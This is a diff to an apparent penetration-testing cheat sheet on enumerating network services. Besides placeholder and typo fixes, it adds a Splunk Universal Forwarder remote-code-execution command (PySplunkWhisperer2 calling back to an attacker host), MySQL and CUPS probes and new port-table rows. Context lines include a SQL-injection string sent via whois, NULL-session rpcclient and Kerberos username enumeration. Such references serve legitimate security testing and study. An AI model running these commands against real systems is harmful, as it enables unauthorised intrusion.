@@ -92,7 +92,7 @@ whois -h IP -p PORT "a') or 1=1#"
 nmap -p- -oA nmap/allports -v IP # 1) Perform a scan on all ports with the verbose mode
 cat nmap/allports.nmap | grep open | awk -F/ '{print $1}' ORS="," # 2) Get all opened ports separated by commas
 nmap -sC -sV -oA nmap/specificports -p PORTS -v IP # 3) Run a Script scan on open ports
-nmap -sY *ip* -v # Perform a SCTP scan
+nmap -sY IP -v # Perform a SCTP scan
 ```
 
 - **-p-**: Run on all ports (except port 0 within some version)
@@ -151,7 +151,7 @@ I prefer to use raccoon for a quick additional scans.
 
 ### DNS Server
 
--> You can change your host file /etc/resolv.conf
+-> You can change your host file /etc/resolv.conf, this may reveal VHOST
 
 ### SSH
 
@@ -308,8 +308,8 @@ You can query the RPC locator service and individual RPC endpoints to catalog in
 [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a tool for executing client side MS-RPC functions
 
 ```bash
-rpcclient -U "" *IP* # Try using an anonymous connection (also called NULL Session)
-rpcclient -U *username* *IP* # (Require Password)
+rpcclient -U "" IP # Try using an anonymous connection (also called NULL Session)
+rpcclient -U UNSERNAME IP # (Require Password)
 ```
 
 - enumdomusers: Enumerate domain users
@@ -526,13 +526,13 @@ Note NETLOGON and SYSVOL are not hidden shares. Instead, these are special admin
 ```bash
 kerbrute usernum -d *domain* *users.txt* # Enumerate valid domain usernames via Kerberos
 # Make sure to test for unvalid username
-cme smb *ip* --pass-pol # Get the password policy
+cme smb IP --pass-pol # Get the password policy
 ```
 
 By default, failures are not logged, but that can be changed with -v.
 Kerbrute has a **--safe** option.
 
-The **Account lockout threshold** policy setting determines the number of failed sign-in attempts that will cause a user account to be locked. 
+The **Account lockout threshold** policy setting determines the number of failed sign-in attempts that will cause a user account to be locked.
 It is recommended to set it to 10 by Microsoft and CIS Benchmark
 By default it's *"0 invalid sign-in attempts"*
 
@@ -628,6 +628,26 @@ Some things to know about NTP:
 
 - **monlist** is a debugging command that allows to retrieve information from the monitoring facility about traffic associated with the NTP service.
 
+### Splunk Universal Forwarder Agent (8090)
+
+The universal forwarder collects data from a data source or another forwarder and sends it to a forwarder or a Splunk deployment. With a universal forwarder, you can send data to Splunk Enterprise, Splunk Light, or Splunk Cloud.
+
+Try to visit https://IP:8090
+
+If you have an admin account you can perform remote code execution with [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2) 
+
+```bash
+PySplunkWhisperer2_remote.py --host IP --port 8090 --lhost OUR_IP --lport OUR_PORT --username USER --password PASS --payload-file FILE
+```
+
+### MySQL
+
+If we have user, we can try to connect on the database 
+
+```bash
+mysql -h IP -u USER
+```
+
 ### Finger Service
 
 Finger is an old user information protocol are simple network protocols for the exchange of human-oriented status and user information that was created in ... 1977.
@@ -661,6 +681,14 @@ rusers -al IP                # Displays the users currently logged on on the mac
 rlogin -l USERNAME <target>  # Connect on a remote machine with a 
 ```
 
+### CUPS
+
+[CUPS](https://ubuntu.com/server/docs/service-cups) is a modular printing system for Unix-like computer operating systems which allows a computer to act as a print server.
+
+```bash
+nmap -p 631 --script cups-info IP # Lists printers managed by the CUPS printing service.
+```
+
 ### Network Ports
 
 |Port(s)|Protocol(s)|Services|
@@ -674,21 +702,24 @@ rlogin -l USERNAME <target>  # Connect on a remote machine with a
 |110|TCP|POP3|
 |111|TCP|NFS(RPC Bind)|
 |123|UDP|NTP|
-|135|RCP & UDP|RPC|
+|135|TCP & UDP|RPC|
 |161|UDP|SNMP (Manager)|
 |162|UDP|SNMP (Agent)|
 |389|TCP|LDAP|
 |465|TCP|SMTP over SSL|
 |514|TCP|RSH|
 |587|TCP|SMTP over TLS|
+|631|TCP & UDP|CUPS|
 |873|TCP|Rsync|
 |995|TCP|POP3 over SSL|
 |1821|TCP|[Oracle](Applications/OracleDatabase.md)
 |2029|TCP & UDP|NFSv4|
+|3306|TCP|MySQL|
 |5985|TCP|WinRM 2.0 HTTP|
 |5986|TCP|WinRM 2.0 HTTPS|
 |8000|TCP|[Java Debug Wire Protocol](Applications/Tomcat.md)|
 |8009|TCP|[AJP Connector](Applications/Tomcat.md)|
+|8090|TCP|Splunk Universal Forwarder Agent|
 |11211|TCP|[Memcached](Applications/memcached.md)|
 
 ### References
